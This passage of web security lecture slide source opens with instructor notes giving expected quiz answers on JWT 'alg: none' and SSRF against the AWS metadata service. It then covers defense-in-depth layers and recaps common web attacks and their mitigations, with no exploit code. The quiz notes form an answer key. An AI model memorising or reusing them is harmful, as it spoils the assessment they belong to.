For Question 4 (JWT `alg: none`), the expected answer goes beyond "it's dangerous" to explain the specific mechanism: the server reads the algorithm from the token header and conditionally skips signature verification for the `none` algorithm. This is a library implementation flaw (trusting the header rather than enforcing expected algorithms) rather than a protocol-level flaw in JWT itself.

For Question 5 (SSRF), students should know the specific AWS metadata service address (169.254.169.254) and understand why it is accessible only from within the cloud network, which is precisely why SSRF, which causes the server to make requests from within the network, is necessary to reach it. The expected output (IAM credentials) connects the SSRF technique to its real-world impact (cloud infrastructure compromise).

:::

%%%
---
unit: Summary
code: DIND
title: Defense in Depth, Layered Web Application Security
---
:::callout style=soft
No single control prevents all web application attacks. **Defense in Depth** applies multiple independent security layers so that a failure in any one layer does not produce a complete security failure.
:::

:::table
| Layer | Controls | Attacks Mitigated |
|---|---|---|
| Code Layer | Parameterized queries, output encoding, input validation | SQLi, XSS, path traversal, command injection |
| Authentication Layer | MFA (preferably FIDO2), strong passwords, bcrypt storage, account lockout | Credential stuffing, brute force, session fixation |
| Authorization Layer | RBAC/ABAC, per-object ownership checks, least privilege | BOLA, BFLA, privilege escalation |
| Transport Layer | HTTPS/TLS 1.3, HSTS, certificate pinning | MitM, session token interception, downgrade attacks |
| Browser Layer | CSP, X-Frame-Options, X-Content-Type-Options, SameSite cookies | XSS, clickjacking, CSRF, MIME sniffing |
| Infrastructure Layer | WAF (OWASP CRS), network segmentation, cloud IMDS v2 | Automated scanning, SSRF, out-of-band exfiltration |
| Monitoring Layer | Audit logging, anomaly detection, SIEM alerting | Breach detection, BOLA at scale, credential stuffing |
:::

:::image src="images/22_defense_in_depth_layers.png" alt="Concentric ring diagram illustrating defense in depth for web applications. The innermost ring is labeled Application Code (parameterized queries, output encoding) in dark red. The next ring outward is Authentication (MFA, bcrypt) in red-orange. The next ring is Authorization (RBAC, ownership checks) in orange. The next ring is Transport Security (HTTPS, HSTS) in amber. The next ring is Browser Controls (CSP, SameSite) in yellow. The next ring is Infrastructure (WAF, segmentation) in light green. The outermost ring is Monitoring and Detection (SIEM, logging) in green. A red arrow representing an attack is shown penetrating partway through the rings before being blocked, illustrating that different attacks are stopped at different layers." caption="Defense in depth for web applications: seven independent security layers, each addressing distinct attack vectors. Compromise of any single layer does not result in total failure when all layers are present." width=full
:::

:::notes
Defense in depth is not a novel security concept, it derives from military strategy, where multiple defensive perimeters ensure that an adversary who breaches one line of defense still faces additional barriers before reaching the objective. In web application security, this principle manifests as a set of independent, complementary controls applied at different layers of the technology stack, each targeting different vulnerability categories and attack techniques.

The critical word in "defense in depth" is independent. If two defenses share a common dependency or failure mode, they do not constitute true defense in depth. For example, relying on a WAF as the primary SQL injection defense and parameterized queries as a backup creates the illusion of defense in depth while actually providing incomplete protection, because if parameterized queries are used correctly, the WAF's SQL injection rules are redundant, and if they are not used, the WAF's rules can be bypassed. True defense in depth means that each layer provides genuine protection against a threat, independently of whether other layers have been bypassed.

The code layer is the most fundamental. Parameterized queries, context-aware output encoding, and input validation are architectural choices made at the time code is written. Unlike network-layer controls, these cannot be bypassed by network routing changes, VPN access, or supply chain compromises that inject malicious traffic before it reaches the WAF. Code-layer defenses are also the most cost-effective to implement, they add negligible performance overhead and, when using modern frameworks, require little additional developer effort beyond understanding which APIs to use.

The monitoring and detection layer, audit logging, anomaly detection, and SIEM integration, deserves emphasis because it is frequently the last layer to be implemented yet provides an essential capability: knowing when a breach has occurred. The OWASP Top 10 category A09 (Security Logging and Monitoring Failures) exists specifically because many organizations deploy the defensive controls in layers one through six yet lack the visibility to detect when those controls are breached. The average time-to-detection for a web application breach, per IBM's Cost of a Data Breach Report 2023, is 204 days. Organizations with mature security monitoring reduce this to hours or days, dramatically limiting the breach impact. NIST SP 800-92 (Guide to Computer Security Log Management) and the CIS Controls (Control 8: Audit Log Management) provide the framework for implementing this layer effectively.

The WAF layer using the OWASP Core Rule Set (CRS) provides signature-based blocking of known attack patterns as a compensating control for sites that cannot immediately remediate all code-layer vulnerabilities. However, WAFs are not a primary defense, they can be bypassed through encoding, fragmentation, and application-specific payload crafting, and they add latency, cost, and operational complexity. They are most valuable as a detection and virtual patching tool: blocking known-exploited CVEs while a formal code fix is developed and deployed. The Cloudflare, AWS WAF, and ModSecurity implementations all ship with the OWASP CRS as a baseline rule set.

The Heartland breach maps onto a defense-in-depth diagram: the code layer failed first (SQL injection without parameterized queries), a layer was missing (no network segmentation between the web server and the payment environment), and the breach was ultimately detected not by Heartland's own monitoring but externally, by the card brands.
:::

%%%
---
unit: Summary
code: SUM
title: Web Application Attacks Summary
---
:::pullquote
SQL injection, XSS, broken authentication, and API flaws all trace back to the same mistake, trusting input that hadn't earned it yet.
:::

:::image src="images/22_summary_web_app_attacks.png" alt="Summary defense matrix for Web Application Attacks. A horizontal strip of five labeled boxes connected by arrows flows left to right. Box 1: SQL Injection (database cylinder with syringe icon), Defense label: Parameterized Queries. Box 2: XSS (browser window with script tag), Defense label: Context-Aware Output Encoding and CSP. Box 3: Auth Failures (broken padlock with user silhouette), Defense label: MFA, Secure Session Tokens, Token Regeneration. Box 4: BOLA (API URL bar with chain break), Defense label: Object-Level Authorization Checks. Box 5: Multi-Stage Attack (chain of all four icons), Defense label: Defense in Depth. Below the strip, a row of corresponding OWASP categories (A03, A03/CWE-79, A07, API1, A01) is shown in small gray text. White background, red accent color, professional textbook style." caption="Web Application Attacks defense matrix: each attack category paired with its primary architectural mitigation, culminating in layered defense for multi-stage threats." width=full
:::

:::list style=chips
- SQL Injection (CWE-89)
- Cross-Site Scripting (CWE-79)
- Authentication Failures (A07)
- API Security (BOLA)
- Multi-stage Attack Chains
- CSRF (CWE-352)
- JWT Vulnerabilities
- SSRF (CWE-918)
- Path Traversal (CWE-22)
- Defense in Depth
:::

:::notes
Today we analyzed the technical mechanics of the most critical web application attacks, moving from abstract vulnerability categories to concrete exploit techniques. Each attack type we examined reveals a specific failure in the fundamental principle of input trust.

SQL Injection exploits the failure to separate data from instructions. When a developer constructs SQL queries by concatenating user input, the database's parser treats attacker-supplied characters as SQL syntax. The fix, parameterized queries, is architecturally absolute: it compiles the query structure before accepting any user data, making it structurally impossible for input to be interpreted as SQL commands. We examined three SQLi variants: In-Band, which returns data directly; Blind Inferential, which extracts data through boolean or timing observations; and Out-of-Band, which exfiltrates data through secondary channels like DNS. The Heartland Payment Systems breach (130 million card numbers) demonstrates the catastrophic real-world impact of SQLi at scale.

Cross-Site Scripting attacks the trust a browser places in a domain's content. Stored XSS weaponizes the database as a payload delivery mechanism, attacking every visitor without further attacker interaction. Reflected XSS requires phishing to deliver the payload. DOM XSS operates entirely on the client side, bypassing all server-side defenses. The correct defense combines context-aware output encoding at render time with a strict Content Security Policy that restricts the execution of unauthorized scripts.

Authentication and session management failures revealed how attackers exploit the lifecycle of identity, from credential stuffing that exploits password reuse across breached databases, to session fixation that exploits the failure to regenerate session tokens after login, to cookie attribute weaknesses that expose tokens to XSS theft and network eavesdropping. Multi-factor authentication is the single highest-impact control for account protection, with FIDO2/WebAuthn providing phishing-resistant assurance that SMS OTP cannot achieve.

API vulnerabilities highlighted the unique challenges of modern decoupled architectures. BOLA attacks exploit the gap between authentication (verifying who you are) and object-level authorization (verifying you own what you're accessing). BFLA attacks exploit the gap between authentication and function-level privilege checks. JWT vulnerabilities allow token forgery when algorithm validation is missing. OAuth misconfigurations enable account takeover through redirect manipulation.

We also examined CSRF, which exploits the browser's automatic cookie attachment behavior; Path Traversal, which exploits unsanitized file paths to read arbitrary files; and SSRF, which exploits server-side request functionality to reach internal resources and cloud metadata services, as demonstrated by the Capital One breach.

The defense-in-depth framework ties all of these mitigations together: code-layer defenses (parameterized queries, output encoding), authentication controls (MFA, bcrypt, session management), authorization checks (RBAC, per-object ownership), transport security (HTTPS, HSTS), browser-layer policies (CSP, security headers), infrastructure controls (WAF, network segmentation), and monitoring (audit logging, SIEM) must all be present. An attacker who finds a gap in any one layer should encounter another independent barrier before reaching the objective. In our next lecture, we will explore the discipline of secure coding, focusing on the specific programming practices, frameworks, and testing methodologies used to prevent these vulnerabilities from ever reaching production.
:::
